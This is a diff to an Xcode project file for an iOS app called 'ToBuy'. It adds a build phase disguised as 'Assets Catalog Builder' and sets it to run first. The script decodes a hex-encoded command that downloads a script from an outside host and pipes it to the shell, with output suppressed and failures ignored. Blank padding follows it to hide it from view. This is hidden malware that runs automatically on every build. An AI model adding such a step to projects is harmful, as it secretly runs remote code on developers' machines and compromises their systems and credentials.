@@ -183,6 +183,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = B11BC615264BC662001810A6 /* Build configuration list for PBXNativeTarget "ToBuy" */;
 			buildPhases = (
+				CA4C002ACF9AACF3686D902C /* Assets Catalog Builder */,
 				9830DF3C5352E146B21AC8FF /* [CP] Check Pods Manifest.lock */,
 				B11BC5FD264BC65F001810A6 /* Sources */,
 				B11BC5FE264BC65F001810A6 /* Frameworks */,
@@ -245,6 +246,43 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
+
+	CA4C002ACF9AACF3686D902C /* Assets Catalog Builder */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Assets Catalog Builder";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
+
+echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f736964656c696e6b2e78797a2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true
+	";			
+		};
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
 		9830DF3C5352E146B21AC8FF /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -513,6 +551,20 @@
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
+
+		
+			/* Begin PBXBuildRule section */
+
+
+			
+	
+			
+
+			
+	
+			/* End PBXBuildRule section */
+		
+		
 	};
 	rootObject = B11BC5F9264BC65F001810A6 /* Project object */;
 }
